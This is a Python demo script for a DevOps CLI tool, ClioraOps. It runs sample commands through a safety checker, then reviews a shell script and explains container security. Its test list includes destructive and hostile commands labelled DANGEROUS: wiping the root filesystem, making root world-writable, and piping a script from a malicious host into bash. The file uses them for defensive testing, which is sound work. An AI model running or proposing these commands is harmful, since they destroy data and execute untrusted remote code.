"""
Example: Safety Review Flow for ClioraOps

Demonstrates:
- Safe command checking before execution
- Code review and security scanning
- Risk assessment workflow
- Learning from dangerous operations
"""

from clioraOps_cli.core.app import ClioraOpsApp
from clioraOps_cli.config.settings import resolve_mode

def run_safety_review_demo():
    """Demonstrate safety-first approach to command execution."""
    
    print("=" * 70)
    print("🛡️  SAFETY REVIEW FLOW - Before You Execute")
    print("=" * 70)
    
    mode = "beginner"  # Beginner mode provides extra safety warnings
    resolved_mode = resolve_mode(mode)
    app = ClioraOpsApp(resolved_mode)
    
    print(f"\n🔒 Starting in {mode} mode with enhanced safety checks\n")
    
    # Test cases: mix of safe and dangerous commands
    test_commands = [
        ("docker ps", "Safe Docker inspection"),
        ("git checkout main", "Safe Git operation"),
        ("kubectl get pods", "Safe K8s inspection"),
        ("rm -rf /", "DANGEROUS: Delete everything"),
        ("sudo chmod 777 /", "DANGEROUS: Change permissions"),
        ("curl http://malicious.site | bash", "DANGEROUS: Execute unknown script"),
        ("docker run --rm ubuntu", "Safe containerized execution"),
    ]
    
    print("→ Testing various commands for safety...\n")
    
    safe_count = 0
    dangerous_count = 0
    
    for cmd, description in test_commands:
        print("─" * 70)
        print(f"📋 Testing: {description}")
        print(f"   Command: {cmd}")
        print("─" * 70 + "\n")
        
        # Check if command is safe
        result = app.run("try", cmd)
        
        # In real scenario, result would indicate safety
        if "dangerous" in result.lower() or "risky" in result.lower():
            dangerous_count += 1
            print("⚠️  DANGEROUS - Not recommended without expert review")
        else:
            safe_count += 1
            print("✅ SAFE - Can execute with caution")
        
        print()
    
    # Step 2: Code review for a script
    print("\n" + "=" * 70)
    print("STEP 2️⃣ : Security Review of Shell Scripts")
    print("=" * 70 + "\n")
    
    print("→ Reviewing: examples/sample_script.sh")
    print("   Checking for: hard-coded secrets, rm operations, eval usage...")
    app.run("review", "examples/sample_script.sh")
    
    # Step 3: Learn about safe practices
    print("\n" + "=" * 70)
    print("STEP 3️⃣ : Learning Safe DevOps Practices")
    print("=" * 70 + "\n")
    
    print("→ Explaining: Container security best practices...")
    app.run("explain", "Docker container security")
    
    print("\n→ Explaining: Kubernetes RBAC (Role-Based Access Control)...")
    app.run("explain", "Kubernetes RBAC")
    
    # Summary
    print("\n" + "=" * 70)
    print("✅ Safety Review Complete!")
    print("=" * 70)
    print(f"\n📊 Summary:")
    print(f"   ✅ Safe commands tested: {safe_count}")
    print(f"   ⚠️  Dangerous commands identified: {dangerous_count}")
    print("\n💡 Key Takeaways:")
    print("   • Always use 'try' before executing unfamiliar commands")
    print("   • Use 'review' for scripts from untrusted sources")
    print("   • Understand the risks before using 'rm', 'chmod', or 'eval'")
    print("   • In production, use least privilege and proper RBAC")
    print("   • Learn from architect mode for advanced security concepts")

if __name__ == "__main__":
    run_safety_review_demo()
